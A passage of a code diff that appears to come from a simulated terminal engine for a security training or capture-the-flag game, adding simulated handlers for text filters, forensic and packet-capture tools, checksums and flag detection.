+      if (!node || node.type !== 'file') return [{ kind: 'error', text: `${cmd}: ${fileArg}: No such file or directory` }];
+      const filterArgs = args.filter((a) => a !== fileArg);
+      return this.dispatchFilter(`${cmd} ${filterArgs.join(' ')}`.trim(), node.content, onFlag);
     }
-    const needle = ignoreCase ? clean.toLowerCase() : clean;
-    const matchesLine = (l: string) => (regex ? regex.test(l) : (ignoreCase ? l.toLowerCase() : l).includes(needle));
-    const matches = lines.filter((l) => (invert ? !matchesLine(l) : matchesLine(l)));
-    matches.forEach((l) => {
-      const m = l.match(FLAG_RE);
-      if (m) onFlag(m[0]);
-    });
-    if (countOnly) return [{ kind: 'output', text: String(matches.length) }];
-    return matches.map((l) => ({ kind: 'output' as const, text: l }));
+    return [{ kind: 'muted', text: `${cmd}: reads from standard input — pipe another command into it, e.g. cat file.txt | ${cmd}` }];
   }
 
   /** Genuinely persists a pipeline's final stdout to the filesystem, same as real `>`/`>>` — a
@@ -1769,6 +2296,8 @@ export class TerminalEngine {
       case 'cd':
         return this.cd(args);
       case 'cat':
+      case 'more':
+      case 'less':
         return this.cat(args, onFlag);
       case 'strings':
         return this.strings(args, onFlag);
@@ -1790,6 +2319,18 @@ export class TerminalEngine {
         return this.find(args);
       case 'grep':
         return this.grep(args, onFlag);
+      case 'awk':
+      case 'sed':
+      case 'base64':
+      case 'wc':
+      case 'sort':
+      case 'uniq':
+      case 'head':
+      case 'tail':
+      case 'cut':
+      case 'tr':
+      case 'xargs':
+        return this.dispatchStandaloneFilter(cmd, args, onFlag);
       case 'whoami':
         return this.whoami();
       case 'id':
@@ -1881,15 +2422,35 @@ export class TerminalEngine {
         return this.exportVar(args);
       case 'aws':
         return this.aws(args, onFlag);
-      case 'wc':
-      case 'sort':
-      case 'uniq':
-      case 'head':
-      case 'tail':
-      case 'cut':
-      case 'tr':
-      case 'xargs':
-        return [{ kind: 'muted', text: `${cmd}: reads from standard input — pipe another command into it, e.g. cat file.txt | ${cmd}${cmd === 'tr' ? ' a b' : ''}` }];
+      case 'sqlite3':
+        return this.sqlite3(args, onFlag);
+      case 'adb':
+        return this.adb(args, onFlag);
+      case 'unzip':
+        return this.unzip(args, onFlag);
+      case 'tar':
+        return this.tar(args, onFlag);
+      case 'volatility':
+      case 'volatility.py':
+      case 'vol.py':
+      case 'vol':
+        return this.volatility(args, onFlag);
+      case 'ausearch':
+        return this.ausearch(args, onFlag);
+      case 'python':
+      case 'python3':
+        return this.python(args, onFlag);
+      case 'tcpdump':
+      case 'tshark':
+        return this.packetCapture(cmd, args, onFlag);
+      case 'suricata':
+      case 'snort':
+        return this.idsEngine(cmd, args, onFlag);
+      case 'md5sum':
+      case 'sha1sum':
+      case 'sha256sum':
+      case 'sha512sum':
+        return this.checksum(cmd, args, onFlag);
       default: {
         const suidResult = this.runSuidBinary(cmd);
         if (suidResult) return suidResult;
